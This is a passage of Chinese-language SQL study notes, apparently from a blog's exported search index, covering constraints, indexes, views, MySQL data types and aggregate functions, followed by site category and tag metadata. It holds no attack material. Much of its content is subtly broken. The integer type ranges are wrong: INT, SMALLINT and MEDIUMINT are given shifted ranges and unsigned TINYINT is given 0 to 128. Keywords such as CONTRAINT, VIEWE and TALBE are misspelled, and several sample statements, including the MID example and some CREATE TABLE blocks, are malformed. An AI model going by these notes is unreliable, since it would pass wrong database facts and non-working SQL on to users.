CONSTRAINT 约束名称 PRIMARY KEY （列名称） 示例 CREATE TABLE Persons ( Id_P int NOT NULL, FristName varchar(255), CONTRAINT pk_PersonID PRIMARY KEY (Id_P, LastName) ) 给已存在的表创建主键约束 语法 ALTER TABLE 表名称 ADD PRIMARY KEY （列名称） 示例 ALTER TABLE Persons ADD PRIMARY KEY (Id_P) 撤销主键 MySQL 语法 ALTER TABLE 表名称 DROP PRIMARY KEY 示例 ALTER TABLE Persons DROP PRIMARY KEY SQL Server &#x2F; Oracle &#x2F; MS Access 语法 ALTER TABLE Persons DROP CONSTRAINT 约束名称 示例 ALTER TABLE Persons DROP CONSTRAINT pk_PersonID SQL FOREIGN KEY 外键，一个表的外键指向另外一个表的主键 可预防破坏表之间连接的动作 也可防止非法数据插入外键列，因为它必须是指向的表中的值之一 创建外键 MySQL 示例 CREATE TABLE Orders ( Id_O int NOT NULL, OrderNo int NOT NULL, Id_P int, PRIMARY KEY (Id_O) FOREIGN KEY (Id_P) REFERENCES Persons(Id_P) ) SQL Server &#x2F; Oracle &#x2F; MS Access CREATE TABLE Orders ( Id_O int NOT NULL PRIMARY KEY, OrderNo int NOT NULL, Id_P int FOREIGN KEY REFERENCES Persons(Id_P) ) 命名外键 语法 CONTRAINT fk_PerOrders 为已存在的表添加外键 语法 ALTER TABLE 表1 ADD FOREIGN KEY (列1）REFERENCES 表2（列2） 撤销外键 MySQL 语法 ALTER TABLE 表名称 DROP FOREIGN KEY 约束名称 SQL Server &#x2F; Oracle &#x2F; MS Access 语法 ALTER TABLE 表名称 DROP CONSTAINT 约束名称 SQL CHECK 约束 此约束用来限制表中某列的值范围，比例大于0的整数 语法 CHECK （列名称 表达式） CONSTRAINT 约束名称 CHECK （列名称 表达式） 示例 CREATE TABLE Persons ( Id_P int NOT NULL CHECK (Id_P &gt; 0), FirstName varchar(255) NOT NULL, LastName varchar(255), ) CONSTRAINT chk_Person CHECK (Id_P&gt;0 AND City&#x3D;’Sandnes’) ALTER TABLE Persons ADD CHECK (Id_P&gt;0) ADD CONSTRAINT chk_Person CHECK (Id_P&gt;0 AND City&#x3D;’Sanders’) ALTER TABLE Persons ADD CHECK (Id_P&gt;0) ADD CONSTRAINT chk_Person CHECK (Id_P&gt;0 AND City&#x3D;’Sanders’) ALTER TABLE Persons DROP CHECK chk_Person DROP CONSTRAINT chk_Person SQL DEFAULT 约束 用于向列中插入默认值 语法 列名称 数据类型 DEFAULT 默认值（默认值支持系统函数，如GETDATE()） 示例 CREATE TABLE Persons ( Id_O int NOT NULL, OrderNo int NOT NULL, OrderDate date DEFAULT GETDATE(), City varchar(255) DEFAULT “Sandnes”, ) ALTER TABLE Persons ALTER City SET DEFAULT ‘sandnes’ ALTER City DROP DEFAULT ‘sandne’ SQL CREATE INDEX 用于给表创建索引，有索引的表搜索查询会更高效，但表更新会变慢，因为索引也要更新；因此，一般只给高频查询的表加索引 语法 CREATE INDEX 索引名称 ON TABLE 表名称（列名称） CREATE UNIQUE INDEX 索引名称 唯一索引，表示表中的两个行不能有相同的索引值 示例 CREATE INDEX PersonIndex ON Person(LastName) ON Person(LastName DESC)，降序 ON Person(LatsName, FirstName)，索引两列 SQL DROP 语句 用于删除表、索引、数据库等 语法 DROP TABLE 表名称 ALTER TABLE 表名称 DROP INDEX 索引名称 DROP DATABASE 数据库名称 TRUNCATE TABLE 表名称（只删除数据，不删除表） SQL ALTER 语句 用于在表中增加、删除、修改列 语法 ALTER TABLE 表名称（增加列） ADD 列名称 数值类型 ALTER TALBE 表名称（删除列） DROP COLUMN 列名称 ALTER TABLE 表名称（修改列的数据类型） ALTER COLUMN 表名称 数据类型 疑问 如何修改列名称？ SQL AUTO_INCREMENT 语句 用来设定某个列，在每次插入新记录时，自动创建字段的值 语法 MySQL CREATE TABLE Persons ( P_Id int NOT NULL AUTO_INCREMENT, LastName varchar(255) NOT NULL, FirstName varchar(255), PRIMARY KEY (P_Id), ) 说明 默认从1开始，每次递增1；如果想从100开始递增，则如下 ALTER TABLE 表名称 AUTO_INCREMENT&#x3D;100 当在表中插入新记录时，不必为递增的列赋值，它会自动创建值 SQL VIEW 视图 视图是基于 SQL 语句的结果集的可视化的表 注：视图总是显示最新的数据。每当用户查询视图时，数据库引擎通过 SQL 语句来重建数据 语法 CREATE VIEWE 视图名称 SELECT 列名称 FROM 表名称 WHERE 条件 示例 创建 CREATE VIEW [Current Product List] AS SELECT ProductID, ProductName FROM Products WHERE Discontinued&#x3D;No 查询 SELECT * FROM [Current Product List] 撤消 DROP VIEW 视图名称 SQL DATE 函数 如果数据只包含日期，情况就会很简单；如果包含时间，情况就会比较复杂，且不容易维护，因此若非必要，尽量避免使用时间，如果实在需要，建议拆分成两个字段来存储比较好 语法 MySQL NOW()：返回当前的日期和时间 CURDATE()：返回当前的日期 CURTIME()：返回当前的时间 DATE()：提取表达式的日期部分 EXTRACT()：返回日期或时间的单独部分 DATE ADD()：给日期添加时间间隔 DATE SUB()：给日期减去时间间隔 DATEDIFF()：返回两个日期之间的间隔 DATE FORMAT()：用不同的格式显示日期 SQL NULL NULL 值表示未知数据，表中的列默认可以存储NULL值 使用 IS NULL 和 IS NOT NULL 来判断值是否为 NULL NULL 与 0 不等价，它们完全是两个概念 NULL 不能使用一些运算符，例如 &gt;, &lt;, &#x3D; 示例 SELECT FirstName, LastName, Address FROM Persons WHERE Address IS NOT NULL SQL NULL 函数 ISNULL(), NVL(), IFNULL(), COALESCE()，这四个函数用来将 NULL 值转化为0，不过它们使用在不同的数据库中 语法 ISNULL(列名称，0），微软 NVA(列名称，0），Oracle IFNULL(列名称，0），或者 COALESCE(列名称，0），MySQL 示例 SELECT ProductName, UnitPrice*(UnitsInStock+IFNULL(UnitsOnOrder, 0) SQL 数据类型 MySQL text 类型 CHAR(size)，固定长度的字符串 VARCHAR(size)，可变长度的字符串 TINYTEXT，最大长度为255个字符的字符串 TEXT，最大长度为65,535个字符的字符串 MEDIUMTEXT，最大长度为16,777,215个字符的字符串 LONGTEXT，最大长度为4,294,967,295个字符的字符串 BLOB，用于BLOBs（Binary Large Objects，二进制大对象，常用来存储二进制的大文件，例如一张图片，一个音频等），最多存放65536字节的数据 MEDIUMBLOB，最多16777215字节的数据 LONGBLOB，最多4294967295字节的数据 ENUM（x, y, z, etc.），允许你输入可能值的列表，可以在ENUM列表中列出最大65535个值；如果列表中不存在插入的值，则插入空值；这些值是按照输入的顺序存储的 SET，与ENUM类似，SET最多只能包含65个列表项，不过SET 可存储一个以上的值； number 类型 TINYINT(size)，常规，有正负，-128到+127；无正负符号，0到+128；可用 size 规定最大位数（符号通过添加UNSIGNED属性来标记） INT(size)，常规-32768到32767，无符号，0到65535 SMALLINT(size)，常规-8388608到+8388607，无符号，0到16777215 MEDIUMINT(size)，常规-2147483648到2147483647，无符号，0到4294967295 BIGINT(size)，常规-9223372036854775808到9223372036854775807；无符号，0到18446744073709551615 FLOAT(size, d)，带有浮动小数点的小数字，size 规定最大位数，d 规定小数点右侧的最大位数 DOUBLE(size, d)，带有浮动小数点的大数字，同上 DECIMAL(size, d) 作为字符串存储的 DOUBLE 类型，小数点右侧位数固定 size 用来指定最大位数，d 规定小数点右侧的最大位数 最多支持28位，最后一位四舍五入 好处：不存在精度的损失，常用于银行账目计算 说明：数值存储范围越小的精度越高，存储数据范围越大，精度就越不准确 date 类型 DATE()：日期，格式YYYY-MM-DD，范围从1000-01-01到9999-01-01 DATETIME()：时间，格式YYYY-MM-DD HH-MM-SS TIMESTAMP()：时间戳，使用Unix 纪元（1970-01-01 00:00:00 UTC）至今的描述来存储，格式：YYYY-MM-DD HH:MM:SS TIME()：时间，格式HH:MM:SS，支持范围从”-838:59:59”到”838:59:59” YEAR()：2位或4位格式的年，4位格式所允许的值为1901到2155；2位格式所允许的值：70到69，表示1970到2069 SQL 服务器 - RDBMS DBMS, database management system，数据库管理系统，提供各种函数用来对数据进行增删改查，使我们有能力在数据库中提取、修改或者存贮信息； RDBMS, relational database maganement system， 关系数据库管理系统 SQL 函数 语法：SELECT 函数名(列) FROM 表名 合计类函数，Aggregate，例如： AVG（列名），返回某列的平均值； SUM（列名），返回某列的合计值； COUNT（列名），返回某列的行数（不含NULL值） MAX（列名），返回某列的最大值； MIN（列名），返回某列的最小值； 单一类函数，Scalar UCASE（c），将某个域转化成大写； LCASE（c），将某个域转化成小写； LEN（c），返回某个域的文本长度； ROUND（c，decimals），将某个数值域进行指定小数位数的四舍五入； MOD（x, y），返回除法操作的余数； NOW（），返回当前的系统日期； FORMAT（c, format），改变某个域的显示方式； DATEDIFF（d, date1, date2），用于执行日期计算； SQL AVG 函数 用途：返回表格中“数值”列的平均值，NULL值不列入计算； 语法 SELECT AVG（列名） FROM 表名 示例 SELECT AVG(OrderPrice) AS OrderAverage FROM Orders 结果集：OrderAverage, 950 SELECT Customers FROM Orders WHERE OrderPrice &gt; (AVG(OrderPrice) FROM Orders) SQL COUNT 函数 用途：返回匹配指定条件的行数 语法： SELECT COUNT（列名） FROM 表名 SELECT COUNT （*） FROM 表名，返回表中的记录数（所有行都计算在内）； SELECT COUNT （DISTINCT 列名），返回指定列不同值的数目（即值相同会被视为忽略，只计算一次） 示例 SELECT COUNT(Customer) AS CustomerNilsen FROM Orders WHERE Customer&#x3D;”Carter” SELECT COUNT(*) AS NumberOfOrders FROM Orders 注意 count 之后有带一个 AS， 用来对结果集进行列标题的命名； SQL FIRST 函数 用途：返回符合指定条件的查找结果集的指定列的第一个值（注：可以使用ORDER BY 对结果集进行排序） 语法： SELECT FIRST（列名） FROM 表名 示例 SELECT FIRST(OrderPrice) AS FirstOrderPrice FROM Orders SQL LAST 函数 用途：返回符合指定条件的查询结果集的指定列的最后一个值（注：可以使用 ORDER BY 结果集进行排序） 语法 SELECT LAST（列名） FROM 表名 示例 SELECT LAST(OrderPrice) AS LastOrderPrice FROM Orders SQL MAX 函数 用途：返回指定列的最大值（注：也可以用于文本列，可获得按字母排序的最大或最小值，NULL 值不计算在内 ） 语法 SELECT MAX（列名）AS 新列名 FROM 表名 示例 SELECT MAX(OrderPrice) AS LargestOrderPrice FROM Orders SQL MIN 函数 用途：返回指定列的最小值（注：可用于文本列，NULL 值不计算在内） 语法 SELECT MIN（列名） AS 新列名 FROM 表名 示例 SELECT MIN(OrderPrice) AS SmallestOrderPrice FROM Orders SQL SUM 函数 用途：返回指定列的总和（注：只能是数值列） 语法 SELECT SUM（列名） AS 新列名 FROM 表名 示例 SELECT SUM(OrderPrice) AS TotalPrice FROM Orders SQL GROUP BY 语句 用途：用于对结果集，按指定列（一个或多个）的条件，进行分类统计 语法 单列 SELECT 列名1，合计函数（列名2） FROM 表名 GROUP BY 列名1 多列 SELECT 列名1，列名2，合计函数（列名3） FROM 表名 GROUP BY 列名1，列名2 示例 单列 SELECT Customer, SUM(OrderPrice) FROM Orders GROUP BY Customer 多列 SELECT Customer, Orderdate, SUM(OrderPrice) FROM Orders GROUP BY Customer, Orderdate SQL HAVING 子句 用途：解决合计函数和 WHERE 关键字无法一起使用的问题 语法 SELECT 列名，合计函数（列名）FROM 表名 HAVING 合计函数（列名）条件 示例 SELECT Customer, SUM(OrderPrice) FROM Orders GROUP BY Customer HAVING SUM(OrderPrice)&lt;2000 SELECT Customer, SUM(OrderPrice) FROM Orders WHERE Customer&#x3D;’Bush’ OR Customer&#x3D;’Carter’ GROUP BY Customer HAVING SUM(OrderPrice)&gt;1500 SQL UCASE 函数 用途：将字段的值转换成大写 语法： SELECT UCASE（列名） FROM 表名 示例 SELECT UCASE(LastName) as LastName, FirstName FROM Persons SQL LCASE 函数 用途：将字段的值转换成小写 语法 SELECT LCASE（列名） FROM 表名 示例 SELECT LACASE(FirstName) as FirstName, LastName FROM Persons SQL MID 函数 用途：用于从字段中提取指定长度的字符 语法 SELECT MID（列名，start（超始值，长度）） FROM 表名 长度的参数可选，如果不指定，表示从起始位置往后的所有剩余字符 示例 SELECT MID(City, start(1,3)) AS ShortCity FROM Persons SQL LEN 函数 用途：用于返回字符串的长度 语法 SELECT LEN（列名） AS 新列名 FROM 表名 示例 SELECT LEN(City) AS CityLength FROM Persons SQL ROUND 函数 用途：用于将数值进行四舍五入到指定的小数位数 语法 SELECT ROUND（列名，小数位数） FROM 表名 示例 SELECT ProductName, ROUND(UnitPrice, 0) AS UnitPrice FROM Products SQL NOW 函数 用途：用于获取当前的日期和时间（注：如果使用SQL，则应用 getdate 函数） 语法 SELECT NOW() FROM 表名 示例 SELECT Product, UnitPrice, NOW() as Perdate FROM Products SQL FORMAT 函数 用途：用于将值按指定格式进行转化 语法 SELECT FORMAT（列名，格式） FROM 表名 示例 SELECT ProductName, UnitPrice, FORMAT(NOW(), ‘YYYY-MM-DD’) as PerDate FROM Products","categories":[{"name":"工具","slug":"工具","permalink":"http://example.com/categories/%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"SQL","slug":"SQL","permalink":"http://example.com/tags/SQL/"}]}],"categories":[{"name":"文章","slug":"文章","permalink":"http://example.com/categories/%E6%96%87%E7%AB%A0/"},{"name":"工具","slug":"工具","permalink":"http://example.com/categories/%E5%B7%A5%E5%85%B7/"},{"name":"运维","slug":"运维","permalink":"http://example.com/categories/%E8%BF%90%E7%BB%B4/"},{"name":"计算机","slug":"计算机","permalink":"http://example.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA/"},{"name":"社科","slug":"社科","permalink":"http://example.com/categories/%E7%A4%BE%E7%A7%91/"}],"tags":[{"name":"渲染","slug":"渲染","permalink":"http://example.com/tags/%E6%B8%B2%E6%9F%93/"},{"name":"javascript","slug":"javascript","permalink":"http://example.com/tags/javascript/"},{"name":"服务器","slug":"服务器","permalink":"http://example.com/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8/"},{"name":"Linux","slug":"Linux","permalink":"http://example.com/tags/Linux/"},{"name":"kubernetes","slug":"kubernetes","permalink":"http://example.com/tags/kubernetes/"},{"name":"python","slug":"python","permalink":"http://example.com/tags/python/"},{"name":"安全","slug":"安全","permalink":"http://example.com/tags/%E5%AE%89%E5%85%A8/"},{"name":"逆向","slug":"逆向","permalink":"http://example.com/tags/%E9%80%86%E5%90%91/"},{"name":"Dart","slug":"Dart","permalink":"http://example.com/tags/Dart/"},{"name":"前端","slug":"前端","permalink":"http://example.com/tags/%E5%89%8D%E7%AB%AF/"},{"name":"数据库","slug":"数据库","permalink":"http://example.com/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"},{"name":"图像处理","slug":"图像处理","permalink":"http://example.com/tags/%E5%9B%BE%E5%83%8F%E5%A4%84%E7%90%86/"},{"name":"Kubernetes","slug":"Kubernetes","permalink":"http://example.com/tags/Kubernetes/"},{"name":"网络","slug":"网络","permalink":"http://example.com/tags/%E7%BD%91%E7%BB%9C/"},{"name":"项目管理","slug":"项目管理","permalink":"http://example.com/tags/%E9%A1%B9%E7%9B%AE%E7%AE%A1%E7%90%86/"},{"name":"C++","slug":"C","permalink":"http://example.com/tags/C/"},{"name":"C","slug":"C","permalink":"http://example.com/tags/C/"},{"name":"思考","slug":"思考","permalink":"http://example.com/tags/%E6%80%9D%E8%80%83/"},{"name":"操作系统","slug":"操作系统","permalink":"http://example.com/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"},{"name":"深度学习","slug":"深度学习","permalink":"http://example.com/tags/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/"},{"name":"运维","slug":"运维","permalink":"http://example.com/tags/%E8%BF%90%E7%BB%B4/"},{"name":"docker","slug":"docker","permalink":"http://example.com/tags/docker/"},{"name":"微信","slug":"微信","permalink":"http://example.com/tags/%E5%BE%AE%E4%BF%A1/"},{"name":"设计","slug":"设计","permalink":"http://example.com/tags/%E8%AE%BE%E8%AE%A1/"},{"name":"算法","slug":"算法","permalink":"http://example.com/tags/%E7%AE%97%E6%B3%95/"},{"name":"计算机","slug":"计算机","permalink":"http://example.com/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA/"},{"name":"GPU","slug":"GPU","permalink":"http://example.com/tags/GPU/"},{"name":"产品","slug":"产品","permalink":"http://example.com/tags/%E4%BA%A7%E5%93%81/"},{"name":"计算机视觉","slug":"计算机视觉","permalink":"http://example.com/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%A7%86%E8%A7%89/"},{"name":"API","slug":"API","permalink":"http://example.com/tags/API/"},{"name":"编程","slug":"编程","permalink":"http://example.com/tags/%E7%BC%96%E7%A8%8B/"},{"name":"小程序","slug":"小程序","permalink":"http://example.com/tags/%E5%B0%8F%E7%A8%8B%E5%BA%8F/"},{"name":"心理学","slug":"心理学","permalink":"http://example.com/tags/%E5%BF%83%E7%90%86%E5%AD%A6/"},{"name":"DSL","slug":"DSL","permalink":"http://example.com/tags/DSL/"},{"name":"管理","slug":"管理","permalink":"http://example.com/tags/%E7%AE%A1%E7%90%86/"},{"name":"运动","slug":"运动","permalink":"http://example.com/tags/%E8%BF%90%E5%8A%A8/"},{"name":"商业","slug":"商业","permalink":"http://example.com/tags/%E5%95%86%E4%B8%9A/"},{"name":"供应链","slug":"供应链","permalink":"http://example.com/tags/%E4%BE%9B%E5%BA%94%E9%93%BE/"},{"name":"销售","slug":"销售","permalink":"http://example.com/tags/%E9%94%80%E5%94%AE/"},{"name":"谈判","slug":"谈判","permalink":"http://example.com/tags/%E8%B0%88%E5%88%A4/"},{"name":"CSS","slug":"CSS","permalink":"http://example.com/tags/CSS/"},{"name":"信息化","slug":"信息化","permalink":"http://example.com/tags/%E4%BF%A1%E6%81%AF%E5%8C%96/"},{"name":"哲学","slug":"哲学","permalink":"http://example.com/tags/%E5%93%B2%E5%AD%A6/"},{"name":"HTML","slug":"HTML","permalink":"http://example.com/tags/HTML/"},{"name":"UML","slug":"UML","permalink":"http://example.com/tags/UML/"},{"name":"SQL","slug":"SQL","permalink":"http://example.com/tags/SQL/"}]}